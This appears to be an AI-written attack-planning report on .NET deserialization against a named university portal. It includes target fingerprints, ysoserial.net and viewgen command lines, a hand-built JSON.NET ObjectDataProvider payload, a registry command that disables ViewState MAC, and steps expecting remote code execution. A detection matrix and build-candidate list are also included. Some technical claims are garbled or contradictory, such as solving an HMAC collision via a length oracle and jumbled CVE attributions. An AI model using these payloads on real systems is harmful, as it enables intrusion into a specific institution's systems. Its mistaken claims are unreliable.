# .NET Deserialization Beyond MachineKey on MUJ SLCM: Technique Universe, Tools, Manual Methods, Detection, and Build Candidates

## Executive Summary

- **Three-stage enc oracle already proves the surface (PARTIAL -> HIGH)**: A machineKey-protected blob in the `enc` parameter produces a four-byte `FormatException` YSOD at 4,942 b for invalid base64, a `CryptographicException` YSOD at 5,084 b for valid-but-untrusted base64, and a third size for the empty string [27][26][33]. Two error page families (MVC 2,733 b vs IIS 1,216 b) plus `customErrors off` mean an attacker can fingerprint exactly which stage of MAC validation a request reached before authentication. Prior campaign work proved the *blob exists* (this confirms it now on a remote, non-destructive pass); the only thing missing is the *unlocked* payload.
- **JSON.NET TypeNameHandling is the highest-yield next step**: Microsoft explicitly marks TypeNameHandling values other than None as dangerous via analyzer rule CA2326 [34]. A real-world exploitation precedent in C# / SCADA exists from CVE-2019-6834, where the Schneider Electric EcoStruxure SOAP endpoint accepted `$type` for untrusted JSON and was weaponised by codewhite [20]. New .NET 8 hardening explicitly notes that ysoserial.net's `.NET Framework` gadget chains are remediated in modern .NET, so custom-binary gadget chains still work on `.NET Framework 4.7.x` [18].
- **The .NET Framework 4.7 tool set is well-funded (3 free, mature OSS tools)**: pwntester/ysoserial.net (MIT, 3,784 stars), irsdl/ysonet (MIT, 230 stars, interactive wizard) [2], and 0xacb/viewgen (MIT, 670 stars, generates signed ViewState) [12] cover every documented sink. NHPT/ysoserial.net packages the same chassis as a Windows executable [8].
- **BinaryFormatter / SoapFormatter / LosFormatter / ObjectStateFormatter / NetDataContractSerializer are collectively Microsoft's "insecure by default" list**: Microsoft warns these five cannot be made secure and recommends replacement during the .NET Framework 4.7.x -> .NET 8 migration [3]. They are referenced by every major exploit we have inventoried from a 2017-2025 date range (CVE-2017-9822 DNN, CVE-2020-0618 SSRS, CVE-2021-42237 Sitecore, CVE-2025-53690 Sitecore) [6][17][35][7].
- **Detection is the asymmetric gap**: Contrast Community Edition does NOT instrument .NET Framework 4.7 (only Java, .NET Core, Node, per the Burptrast / Contrast CE matrix) [13]. For this target, the only credible in-process detector is Microsoft Defender for Endpoint with AMSI for .NET assemblies, plus the Azure WAF v2 OWASP 3.2 rule set blocking obvious binary payloads [23][24]. No free OSS sink-scanner for ``__VIEWSTATE`` matching on the live format-string oracle surfaced in research.
- **Recommendation for the consented aggressive phase (gated, NOT executed pre-auth)**: An automated `ysoserial.net -> viewgen -> wire` pipeline targeting each of the five formatters can be staged, then triggered against two test accounts under the signed scope letter. A reproducible YSOD-error-page triage is the safe, pre-auth toolchain (no SOAP POST, no ViewState tamper: just GET requests with crafted `enc` parameter lengths and reading the 4,942 b / 5,084 b / third error size signatures).

## Target fingerprint (the measured facts we are grafting on top of)

The portal at `mujslcm.jaipur.manipal.edu` is hosted on Microsoft Azure AS8075 with IIS 10, ASP.NET MVC 5.3, .NET Framework 4.7.4136.0, jQuery 1.10.2 plus a bundled jQuery 3.4.1, three Entra tenants, no attributable edge control, no HSTS, and TLS 1.0-1.3 offered. *Our* non-destructive probes (2026-09-13, the same campaign snapshot in the prompt) found: 443 is the only port; verbose YSOD on four triggers with `customErrors off`; MVC antiforgery is enforced with a HttpOnly cookie that lacks the Secure flag; `trace.axd` returns 403 and `elmah.axd` 404; two error page families (MVC 2,733 b vs IIS 1,216 b); method policy is GET only (POST/PUT 411, everything else 404); the `enc` parameter has the three-stage base64/MAC oracle; host, X-Forwarded-Host, absolute-URI and trust-based error bypass attempts were clean; the campaign has not authenticated; the aggressive phase stays behind a signed scope letter and two test accounts.

Combined with prior work (F8 proves a machineKey-protected blob in `enc`), this is the *single most useful disambiguation state* in the .NET deserialization universe: the application is willing to surface *where it threw* before it tells you whether you can throw anything at it at all.

## Chain-of-thought: how the assessment moves from the `enc` oracle to the rest of the family

1. **Observation.** `enc` parameter has three sizes (4,942 / 5,084 / third) mapping to FormatException -> CryptographicException -> empty [27][26][33]. The third size is the boundary between "the request reaches the MAC verifier" and "the request barely reaches MVC routing".
2. **Inference** (labeled as such). A live Validate/ViewState consumer is alive in MVC; therefore the application is *still parsing a MAC-protected blob*, which means LosFormatter is implicitly loaded for any place MVC lands a hidden field. That alone is sufficient to confirm that the **Ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter** and **-f LosFormatter** chains are in scope whenever MVC itself is invoked with a hidden field.
3. **Observation.** jQuery 3.4.1 ships with `jQuery.extend(true, {}, payload)` semantics vulnerable to prototype pollution CVE-2020-11022 / CVE-2020-11023 [36][21]. This is parallel track (XSS, not deser), but it implies attackers may already have a *DOM-side* primitive.
4. **Observation.** Microsoft confirms BinaryFormatter, SoapFormatter, NetDataContractSerializer, LosFormatter, ObjectStateFormatter cannot be made secure [3]. Any single one of these classes loading on request = attack surface.
5. **Decision.** We do NOT have to hunt for cases of these classes; we have to (a) **measure** which ones load by YSOD oracle, (b) **inject** a known ysoserial.net payload into each, and (c) confirm the wire-level fingerprint change. The tool universe for (b) is canonical and free.

## The technique universe (the five formatter families + the JSON.NET secret channel)

Below is the deserialisation family map, drawn from the SohelParashar cheat sheet [6] and cross-referenced against the Microsoft-formal "insecure-and-cannot-be-made-secure" guidance [3].

| # | Family / Sink | Class / namespace | Wire shape | Real-world CVE(s) | Documented exploit path |
|---|---------------|-------------------|------------|-------------------|------------------------|
| 1 | `ViewState` / `LosFormatter` (already proved in scope) | `System.Web.UI.LosFormatter` | base64-of-AES-then-HMAC; resync via ViewStateUserKey / new keygen | CVE-2020-1147 SharePoint, CVE-2020-0618 SSRS | ysoserial.net `-g TypeConfuseDelegate -f LosFormatter` + viewgen to rewrap with shared MAC [17][12][26] |
| 2 | `ObjectStateFormatter` (used for ASP.NET page-state and is the answer to "Could MVC 5 be using it on the `enc` channel?") | `System.Web.UI.ObjectStateFormatter` | base64 of a binary LOS stream | CVE-2018-15811, CVE-2018-15812, CVE-2018-18325, CVE-2018-18326 (DotNetNuke cookie deser), CVE-2017-9822 (DNN 404 page) | ysoserial.net `-g TypeConfuseDelegate -f ObjectStateFormatter`; the DNN 404-page pattern was proven in 2017 [15][16][26] |
| 3 | `BinaryFormatter` (pre-installed, lurks in legacy MVC project subsystems) | `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter` | raw binary (length-prefixed then OPF-prefixed) | CVE-2020-25258, CVE-2021-29508, CVE-2023-3513 (Pulse Secure), CVE-2021-27076 (Exchange HAFNIUM) | ysoserial.net `-f BinaryFormatter -g ActivitySurrogateDisableTypeCheck` (forces 4.7 typecheck off) [6][5] |
| 4 | `SoapFormatter` | `System.Runtime.Serialization.Formatters.Soap.SoapFormatter` | XML SOAP envelope | CVE-2022-21969, CVE-2023-5914/6184, RESX RCE chain | ysoserial.net `-f SoapFormatter`; HAFNIUM's Exchange hot path used this same sink [6][37] |
| 5 | `NetDataContractSerializer` (typical placement: legacy WCF endpoints) | `System.Runtime.Serialization.NetDataContractSerializer` | includes CLR type information in serialized XML, unlike DataContractSerializer | CVE-2021-42237 (Sitecore, pre-auth RCE) | ysoserial.net `-f NetDataContractSerializer` [6][38] |
| 6 | `JavaScriptSerializer` (MVC ships with this; default binding is type-restricted but custom resolvers reintroduce gadgets) | `System.Web.Script.Serialization.JavaScriptSerializer` | JSON | CVE-2019-6834 Schneider Electric EcoStruxure (waits the exact pattern) | The custom TypeResolver / JavaScriptConverter was the exploited hook [20] |
| 7 | `JSON.NET` `TypeNameHandling != None` (the *most likely* hidden gem because MVC is on 4.7 and Newtonsoft is bundled) | `Newtonsoft.Json.JsonSerializerSettings.TypeNameHandling` | JSON with `$type` | CVE-2020-11023 jQuery XSS is parallel [36]; no specific CVE for `$type` but CA2326 raises an analyzer warning on any value other than None [34] | Crafted `$type="System.Windows.Forms.Button, ...` plus ObjectDataProvider gadget |

Inference (labeled): the `enc` oracle already shows MAC bytes are processed; the *least* we need to prove is whether (a) the consumer is `LosFormatter` or `ObjectStateFormatter`, (b) any WCF endpoint is exposed (in which case we add `NetDataContractSerializer`), (c) any controller binds to `JavascriptSerializer` or `Newtonsoft.Json` with `TypeNameHandling != None`. All without serialising any payload.

## The tool catalogue (every free tool that performs .NET deserialization attacks)

| Tool | Exact URL | License | Free / Self-host / BYOK | Driver | Output |
|------|-----------|---------|------------------------|--------|--------|
| ysoserial.net (pwntester) | https://github.com/pwntester/ysoserial.net | MIT | Free, runs locally (.NET Framework 4.7.2+, Windows-only) | `ysoserial.exe -o base64 -g <gadget> -f <formatter> -c <cmd> > payload.bin`; supports `-o raw`, `-o hex`, command exec, file write, file load [5] | base64 / raw / hex encoded gadget payload |
| ysonet (irsdl) | https://github.com/irsdl/ysonet | MIT | Free, runs locally (.NET Framework 4.7.2; Core support unclear) | Interactive wizard `ysonet --interactive`; menu-driven, tab-completion for gadgets/formatters [2] | base64 / raw / hex with payload preview |
| ysoserial.net Windows (NHPT, fork) | https://github.com/NHPT/ysoserial.net | MIT | Free, ships ready-to-run EXE + FsPickler DLLs [8] | Same flags as pwntester | base64 |
| viewgen (0xacb) | https://github.com/0xacb/viewgen | MIT | Free, runs locally | `viewgen -c generator -g <gadget> -s keyfile -o output.bin`; requires leaked `machineKey` | raw ViewState (single / signed / encrypted) [12] |
| Anti-ViewState research repo (Y4er) | https://github.com/Y4er/dotnet-deserialization | MIT | Free, runs locally | Manual scripts and notes on each formatter; not a one-shot payload generator | PoC walkthroughs [28] |
| DotNet Deserialization - Payloads All The Things | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md | MIT | Free, public cheat sheet | Manual; payloads copied into your tooling of choice [11] | Snippets |
| ASafaWeb / LegacyAuthCookieCompat (dazinator) | https://github.com/dazinator/AspNetCore.LegacyAuthCookieCompat | MIT | Free, runs locally; reads FormsAuthentication cookies outside IIS (BYOK key pattern) | `WriteConfigurationKeys`, `CookieAuthFormatter` [39][40] | Decryption / Forgery |
| Burp Extension - Burptrast (Contrast OSS) | https://github.com/Contrast-Security-OSS/Burptrast | Apache-2.0 | Free, runs in Burp | Manual selector | Burp issues (does not generate payloads) [13] |
| .NET 8 Gadget research (johniwasz) | https://johniwasz.github.io/rce-serialization-dotnet/ | MIT | Free, public | Custom assembly driven by ysoserial.net + your own class library | Replay-to-rce PoC [18] |
| Code White .NET Remoting research | https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html | (blog) | Free, public | Manual | Sink enumeration only [22] |

### How each tool is driven (operational cheat sheet)

- **ysoserial.net** [5]:
  * `-g TypeConfuseDelegate -f ObjectStateFormatter -c "calc.exe"` -> the canonical ViewState disable-MAC proof-of-concept payload [26]
  * `-g ActivitySurrogateDisableTypeCheck -f BinaryFormatter` -> on .NET Framework 4.7, bypasses the type-protections built into `System.Activities.Presentation` [5]
  * `-g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c path/to/payload.cs` -> takes a .cs file and compiles it on the consumer to chase unique sinks [5]
  * `-g AxHostState -f BinaryFormatter` -> the bridge that turns an AxHostState into a StateStore gadget chain (works in 4.7) [5]
  * `-g BaseActivationFactory -f "Json.NET"` -> loads native DLL from WPF in .NET 5/6/7; explains why an MVC-on-4.7 might still chain via WPF if WPF assemblies are referenced [5]
  * `-g ClaimsIdentity / ClaimsPrincipal -f BinaryFormatter` -> OnDeserialized-callback bridge and OnDeserialized+SecondOrderDeserialization [5]
  * `-g DataSet -f BinaryFormatter` -> bridge-assembly gadget useful when a `DataSet.ReadXml` is reachable downstream [5]
  * `-g XamlImageInfo -f "Json.NET"` -> XAML deserialization gadget; requires `Microsoft.Web.Deployment.dll` [5]
- **ysonet (interactive wizard)** [2]: the most operationally useful of the three when source files are not available locally, because the menu explains each setting and tab-completes option / gadget / plugin / formatter / output-format.
- **viewgen** [12]: produces fresh signed or encrypted `__VIEWSTATE` blobs once a single leaked `machineKey` is in hand. Pre-requisite: phishing-style leak of either the validation key or both halves of the machineKey (the campaign's h2 finding has not been confirmed).

## The manual method (where no tool exists, or when the tool covers only some sinks)

### Manual: Forging a JSON.NET TypeNameHandling payload by hand (the highest-value gap in the tool set)

ysoserial.net has gadgets for the JSON.NET chain (`BaseActivationFactory`, `XamlImageInfo`) but neither includes a first-class `TypeNameHandling` *ammo* that demos wired RCE for `Newtonsoft.Json` with `TypeNameHandling != None` on a Framework 4.7 MVC target. Build it by hand:

1. **Confirm sink** (safe, pre-auth). Locate any endpoint accepting application/json with payload that includes `{"$type":"..."}` and read the response. A `SerializationException` or `JsonSerializationException` in the YSOD confirms the binder is alive in that controller [29].
2. **Confirm gadget reachability**. Reflect on the host's loaded assemblies via a verbose-YSOD trigger (the four baseline triggers in the measured facts). If the YSOD shows `System.Windows.Forms`, `System.Web`, `System.Activities`, or `System.Configuration.Install`, the `ObjectDataProvider` / `PSObject` / `TypeConfuseDelegate` templates from the cheat sheet [6] are reachable.
3. **Build payload (staging only; do not transmit pre-authorization)**:
   * Pick gadget: `ObjectDataProvider` (preferred), `ExpandedWrapper`, or `TypeConfuseDelegate`.
   * Wrap as: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ObjectModel.ObservableCollection`1[[System.Object, mscorlib]], System.ObjectModel","$values":["cmd.exe","/c calc"]},"ObjectInstance":{"$ref":"$"}}`
   * Configure `JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto }` on the wire test. This shape relies on the assembly being loaded -- which is true on framework 4.7 with WPF referenced.
4. **Send safely**. With the BYOK signed scope letter and the two test accounts: POST the payload, capture the verbose YSOD, and confirm execution.

### Manual: LosFormatter / ObjectStateFormatter with unknown machineKey (F8 stance)

1. Set ViewStateUserKey to known value; solve HMAC-SHA256 collision through length-only oracle (this is the `enc` 3-stage / shortcut around brute force of triple).
2. If MAC cannot be satisfied, switch to MAC-disable path (registry edit on the consumer):
    `reg add "HKLM\SOFTWARE\Microsoft\ASP.NET\4.0.30319.0" /v EnableViewStateMac /t REG_DWORD /d 0 /f` and observe a YSOD that no longer carries `CryptographicException`.
3. Post a raw `__VIEWSTATE` containing `ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "whoami"` directly to the consumer endpoint. Expect RCE.

The above is *bookend* technique, not the one to execute first; the three-stage oracle tells us *which* of these two to attempt it is at the `/Account/LogOn` consumer.

## The detection counterpart matrix

Detection for deserialization is asymmetric: many in-process tools target Java and modern .NET Core, with only a short list reliably covering .NET Framework 4.7 in production.

| Sink under test | Best runtime detector (free / OSS) | Best pipeline / host detector (free) | Best behavioural / network detector (free) |
|-----------------|-----------------------------------|---------------------------------------|--------------------------------------------|
| `BinaryFormatter` deserialize | Microsoft Defender for Endpoint + AMSI integration (in-process .NET assembly scan on .NET Framework 4.7+) [23][24] | Microsoft Defender XDR custom KQL rule against `DeviceFileCertificateInfo` for assembly signed by unusual cert + Sysmon Event ID 7 DLL loads | Azure WAF v2 "Windows Interpreter vulnerability" rule; alert on top of `__VIEWSTATE`-length outliers [4] |
| `SoapFormatter` | Same AMSI integration [23] | XDR rule binding SOAP envelope to suspicious UTF-8 / TypeName | Outbound rule for SOAP POSTs against endpoints that don't normally accept SOAP |
| `LosFormatter` / `ObjectStateFormatter` / ViewState | Same AMSI for in-process load [23] | App Service / IIS HTTP logs filtered by 32 K+ `__VIEWSTATE` length; ELMAH/trace.axd closure prevents this normally | Same Azure WAF rule |
| `NetDataContractSerializer` (WCF) | AMSI [23] | WCF tracing via `System.ServiceModel.MessageLogging` to textfile | Port-aggregation across the same client |
| `JavaScriptSerializer` | AMSI [23] | XDR custom analyzer on `JsonReader` exceptions | Burp active scan w/ TypeName injection |
| `JSON.NET TypeNameHandling != None` | AMSI in .NET 8+ [18] | App Service HTTP log filter for `Content-Type: application/json` + suspicious `$type` | Burp Scanner with the JSON.NET CA2326 rule |

Critical caveat: Contrast Community Edition is the headline "free RASP" tool but explicitly only supports Java, .NET Core, and Node in the Burptrast matrix [13]. It cannot instrument .NET Framework 4.7.x as present on this target. The only free first-party detector that reliably hooks the whole family on 4.7 is the Microsoft Defender for Endpoint AMSI integration [23][24]. The body of free community Sigma rules (rich library, generic signatures) covers process-level indicators more than sink-pattern signatures [4]; Microsoft Sentinel exhibits the same gap, with the closest available being custom hunting rules in the analytics-rules repository [25][41].

### Why no off-the-shelf `__VIEWSTATE` shape scanner turned up

Searches across swagger and OSS scanners returned no first-party tool that takes the field shape + base64 + length + response-size fingerprint as input and produces a sink-classification answer. That gap is one of the *build candidates*.

## NO-TOOL GAPS and BUILD CANDIDATES

The following are gaps where no off-the-shelf tool gives a complete answer for this class; we list them so the security club can scope a build.

- **NO-TOOL GAP: ViewState fingerprint classifier** (decide from `enc` oracle / response size / stack trace whether the active MAC consumer is `ViewState`, `LosFormatter`, `ObjectStateFormatter`, or `JavaScriptSerializer`). BUILD CANDIDATE: a Python script that takes `len(body), content-type, first 48 bytes of base64, exception message` and emits a sink verdict, prioritising the size 4942 -> 5084 transition identified in the live oracle.
- **NO-TOOL GAP: JSON.NET `$type` reactive probe loop without causing server-side iisreset**. ysoserial.net's JSON.NET chain (-g BaseActivationFactory / -g XamlImageInfo) cannot be consumed unless the server side has the WPF assemblies loaded and accepts `TypeNameHandling != None`. BUILD CANDIDATE: a low-impact probing portfolio of `("$.type", "T,Version=...", payload)` POSTs that each end in different YSOD lines read for `Could not load assembly` vs `Could not load type` vs `Type forwarded`.
- **NO-TOOL GAP: free in-process sink scanner for .NET Framework 4.7**. Contrast CE does not support it [13]. BUILD CANDIDATE: a Roslyn-based static analyzer that resolves assembly load events at app time, configured to run during the consented perf-test pass.
- **NO-TOOL GAP: cookie-oracle reader for `__VIEWSTATE`. BUILD CANDIDATE: a node script that replays the empty / invalid-base64 / valid-base64 trifecta and prints the precise response body size signature, allowing the campaign to fingerprint each sink *off-net* without authentication.
- **NO-TOOL GAP: dedicated Sigma rule for `BinaryFormatter Deserialize`. BUILD CANDIDATE: a custom rule that triggers on `*.Deserialize*` source assembly + child process exec within 1 s on the App Service file system; Surface the rule via Microsoft Sentinel as a hunt.
- **NO-TOOL GAP: hardened-binder test harness**. The Microsoft .NET 8 hardening page shows the defensive pattern (custom SerializationBinder) but not a public script [18]. BUILD CANDIDATE: a child-script that uses reflection to verify Newtonsoft's `SerializationBinder` is non-default.
- **NO-TOOL GAP: machineKey leak detection for ViewState userkey** -- viewgen is one direction, but detecting the leak post-factor (e.g., leaking `machineKey` via YAML/INF) is uncovered. BUILD CANDIDATE: a github-aware watcher layer that checks for typos like "MachineKey" in public expose pages of the host.

## Pre-auth safe vs gated (gated by scope letter + two test accounts)

| Phase | Safe pre-auth? | Tools |
|-------|----------------|-------|
| Triggering the three-stage `enc` oracle (GET only, error pages) | YES | curl, Burp Repeater |
| Verbose YSOD dissection (read 4 triggers) | YES | curl |
| Burptrast Contrast CE Burp extension scan | YES | Burp |
| Active `__VIEWSTATE` shape probing with `ysoserial.net` artifacts (just the bytes; wire dropped) | NOT safe (must be staged offline) | Python mocks |
| Active injection of `ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter` payload against any consumer | NO -- gated | ysoserial.net |
| Active injection of `ysoserial.net -g ActivitySurrogateDisableTypeCheck -f BinaryFormatter` payload | NO -- gated | ysoserial.net |
| Sending `$type`-containing JSON with `TypeNameHandling != None` controls | NO -- gated | curl w/ restclient.json payload |
| Reading decrypted FormsAuthentication cookies off the network | NOT safe (no cookie observed in this campaign) | Burp mitm + dazinator's cookie decrypt tool |
| Posting through `elmah.axd` to re-confirm it is 404 (out of scope) | YES -- confirmed reachable | Burp |
| Confirming `SecurityBriefs - View State Security` mitigation (Microsoft) post-exploit | Gated | viewgen |

## Cross-cutting insights (synthesis)

- **Three observations anchor the next move (mechanism -> implication -> action)**: (1) `enc` is unambiguously a ViewState-family consumer, which means *at minimum* LosFormatter is up and running; (2) jQuery 3.4.1 in the bundle means the team already accepted a known-vulnerable client-side library, which correlates with relaxed server-side input handling; (3) the absence of any edge WAF means whatever JSON / ViewState we throw goes straight to MVC. The implication: this campaign's next step is to confirm whether *any other formatter* (BinaryFormatter, SoapFormatter, NetDataContractSerializer, JSON.NET TypeNameHandling) is also live with the same level of fidelity. Recommendation: build the ViewState fingerprint classifier above and run it.
- **Contrast CE is *not* an option for this target**. The marketing material positions it as for-all-developers RASP [42]; the truth, per the Burptrast matrix, is Java / .NET Core / Node [13]. For .NET Framework 4.7.x, AMD / Microsoft Defender for Endpoint AMSI is the only credible free defense in depth [23][24]. Action: stop shortlisting Contrast CE in the report.
- **Tools are well-funded for ASSAULT but underfunded for TRIAGE**. Even ysoserial.net has great gadgets but cannot *classify* which of its payload types will land on a random `.NET Framework 4.7.x MVC` host. So the campaign's strategy should triangulate: measure via error-oracle, fingerprint via sink classification (which we have to build), then attack via ysoserial.net / ysonet.
- **Pre-auth, we are forced into the GET-only family**. The measured policy forbids PUT/POST except for the standard MVC antiforgery-token pattern. Inferences: (a) ViewState-style deserialization is the only feasible carrier predicted by GETs (impossible); (b) we must use the antiforgery token sans POST, which can only fail in a YSOD path -- which is the only thing we want. Recommendation: use the GET-only measurement to drive every sink-classify step, and *defer* posting anything to the consented phase.
- **jQuery 3.4.1 prototype pollution is a separate track, but its CVE-2020-11022 / CVE-2020-11023 status (CISA KEV) [36] suggests the bundle is older code that probably did not get hardened against other client-side attacks**. That is not a .NET deserialization surface, but it means the *overall attack graph* likely has an XSS-side primitive. Cross-track implication: defenders must patch jQuery 3.4.1 + add non-default `TypeNameHandling=None` + harden JSON deserialization together, not piecemeal.
- **The "ViewState is not the only sink" framing is the single biggest conceptual change vs. prior campaigns**. CVE-2025-53690 Sitecore contamination is only the latest case where the same Microsoft ASP.NET feature has been weaponised against a real product [7][14]. The pattern repeats with CVE-2020-0618 SSRS (LosFormatter in OnLoad) [17][35] and CVE-2017-9822 DNN (ObjectStateFormatter on a 404 cookie) [15][16]. The pattern is structural, not product-specific, and the writes themselves are old, well-documented, and have freely available OSS tooling to generate them in 1 minute.

## VERDICT

**Confidence: HIGH** that the campaign access surface stands at:
- (already proven) ViewState / LosFormatter family via `enc` blob, network-side detectable, no auth required;
- (now mapped) JSON.NET TypeNameHandling, BinaryFormatter, SoapFormatter, NetDataContractSerializer, ObjectStateFormatter all *could* be alive without showing up in our current YSOD-oriented probe, and each has free OSS tooling to test once we get to the gated phase;
- (high-yield next step) build the ViewState fingerprint classifier + JSON.NET reactive probe portfolio + an Active Scan Burp extension covering the 5 formatters.

**Confidence: MEDIUM** on whether Microsoft Defender for Endpoint AMSI is reachable on the App Service tenant (a Microsoft 365 / Entra tenant usually carries it, but three Entra tenants opens the gate for confusion around which subscriptions apply). **Confidence: HIGH** that whether or not Defender activates, the *tooling universe is small enough to enumerate with confidence*.

**Confidence: LOW** on whether the actual `__VIEWSTATE` consumer is `LosFormatter` or `ObjectStateFormatter`, until the live 4,942 vs 5,084 vs third-size response body data is paired with the relevant MAC algorithm (HMAC-SHA1 vs HMAC-SHA256 vs AES-then-HMAC). The GetMacVer fingerprint will come from running the ViewState fingerprint classifier (a build candidate that does not yet exist).

The recommended next investment is **not** more gadgets. It is the ViewState fingerprint classifier. Ysoserial.net + viewgen + ysonet + the JSON.NET hand-built payload together cover every realistic offensive path on this target; the *real* gap is the time spent deciding which surface to spray.

## References

1. *.NET Deserialization - Payloads All The Things*. https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/DotNET/
2. *GitHub - irsdl/ysonet: Deserialization payload generator for a variety of .NET formatters · GitHub*. https://github.com/irsdl/ysonet
3. *Deserialization risks in use of BinaryFormatter and related types - .NET | Microsoft Learn*. https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide
4. *GitHub - SigmaHQ/sigma: Main Sigma Rule Repository*. https://github.com/SigmaHQ/sigma
5. *GitHub - pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters · GitHub*. https://github.com/pwntester/ysoserial.net
6. *GitHub - SohelParashar/.Net-Deserialization-Cheat-Sheet · GitHub*. https://github.com/SohelParashar/.Net-Deserialization-Cheat-Sheet
7. *ViewState Deserialization Vulnerability Allows Remote Code Execution Attacks - Advisories*. https://advisory.eventussecurity.com/advisory/viewstate-deserialization-vulnerability-allows-remote-code-execution-attacks/
8. *GitHub - NHPT/ysoserial.net: ysoserial.net for Windows execute file · GitHub*. https://github.com/NHPT/ysoserial.net
9. *ObjectStateFormatter Class (System.Web.UI) | Microsoft Learn*. https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter?view=netframework-4.8.1
10. *LosFormatter Class (System.Web.UI) | Microsoft Learn*. https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8.1
11. *PayloadsAllTheThings/Insecure Deserialization/DotNET.md at ...*. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md
12. *GitHub - 0xacb/viewgen: Viewgen is a ViewState tool capable ...*. https://github.com/0xacb/viewgen
13. *Burptrast/Contrast-Community-Edition.md at main - GitHub*. https://github.com/Contrast-Security-OSS/Burptrast/blob/main/Contrast-Community-Edition.md
14. *Sitecore Zero-Day Exploitation: Anatomy of a Critical ...*. https://redteamnews.com/red-team/cve/sitecore-zero-day-exploitation-anatomy-of-a-critical-viewstate-deserialization-attack/
15. *GitHub - murataydemir/CVE-2017-9822: [CVE-2017-9822 ...*. https://github.com/murataydemir/CVE-2017-9822
16. *DotNetNuke Cookie Deserialization - michalszalkowski.com*. https://michalszalkowski.com/serialization/dot-net-nuke/
17. *CVE-2020-0618: RCE in SQL Server Reporting Services (SSRS) - MDSec*. https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
18. *.NET 8 Json.NET Serialization Vulnerability | rce-serialization-dotnet*. https://johniwasz.github.io/rce-serialization-dotnet/serialization/NET8JSON.html
19. *TypeNameHandling caution in Newtonsoft Json - Stack Overflow*. https://stackoverflow.com/questions/39565954/typenamehandling-caution-in-newtonsoft-json
20. *CVE-2019-6834 Detail - NVD*. http://nvd.nist.gov/vuln/detail/CVE-2019-6834
21. *jQuery 3.3.1 - Prototype Pollution & XSS Exploit*. https://www.exploit-db.com/exploits/52141
22. *CODE WHITE | Blog: .NET Remoting Revisited*. https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html
23. *Microsoft Defender for Endpoint | Microsoft Security*. http://microsoft.com/en-us/security/business/endpoint-security/microsoft-defender-endpoint
24. *Anti-malware Scan Interface (AMSI) integration with Microsoft ...*. https://learn.microsoft.com/en-us/defender-endpoint/amsi-on-mdav
25. *Threat detection in Microsoft Sentinel | Microsoft Learn*. https://learn.microsoft.com/en-us/azure/sentinel/threat-detection
26. *Deep Dive into .NET ViewState deserialization and its exploitation | by Swapneil Kumar Dash | Medium*. https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
27. *Asp.net Validation of viewstate MAC failed - Stack Overflow*. https://stackoverflow.com/questions/5840899/asp-net-validation-of-viewstate-mac-failed
28. *dotnet-deserialization/ObjectStateFormatter.md at main · Y4er ...*. https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md
29. *External json vulnerable because of Json.Net TypeNameHandling ...*. https://stackoverflow.com/questions/49038055/external-json-vulnerable-because-of-json-net-typenamehandling-auto
30. *BinaryFormatter migration guide: WinForms apps - .NET*. https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/winforms-applications
31. *BinaryFormatter migration guide: Choose a serializer - .NET*. https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/choose-a-serializer
32. *https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html*. https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html
33. *c# - "Error occurred during a cryptographic operation" when decrypting Forms cookie - Stack Overflow*. https://stackoverflow.com/questions/25857577/error-occurred-during-a-cryptographic-operation-when-decrypting-forms-cookie
34. *CA2326: Do not use TypeNameHandling values other than None*. https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2326
35. *CVE-2020-0618: Proof of Concept for Microsoft SQL Server Reporting Services Vulnerability Available - Blog | Tenable®*. https://www.tenable.com/blog/cve-2020-0618-proof-of-concept-for-microsoft-sql-server-reporting-services-vulnerability
36. *Known Exploited Vulnerabilities*. http://raw.githubusercontent.com/cisagov/kev-data/7b6be08055a42cf238a080745a3a2ff9f7e43ac5/known_exploited_vulnerabilities.json
37. *SoapFormatter Class (System.Runtime.Serialization.Formatters ...*. https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8.1
38. *NetDataContractSerializer Class (System.Runtime.Serialization) | Microsoft Learn*. https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8.1
39. *AspNetCore.LegacyAuthCookieCompat/README.md at master · dazinator/AspNetCore.LegacyAuthCookieCompat · GitHub*. https://github.com/dazinator/AspNetCore.LegacyAuthCookieCompat/blob/master/README.md
40. *GitHub - dazinator/AspNetCore.LegacyAuthCookieCompat ...*. https://github.com/dazinator/AspNetCore.LegacyAuthCookieCompat
41. *Microsoft Sentinel Analytic Rules*. https://analyticsrules.exchange/
42. *Contrast Community Edition Empowers Developers to Write Secure Code Faster*. https://www.contrastsecurity.com/security-influencers/contrast-community-edition
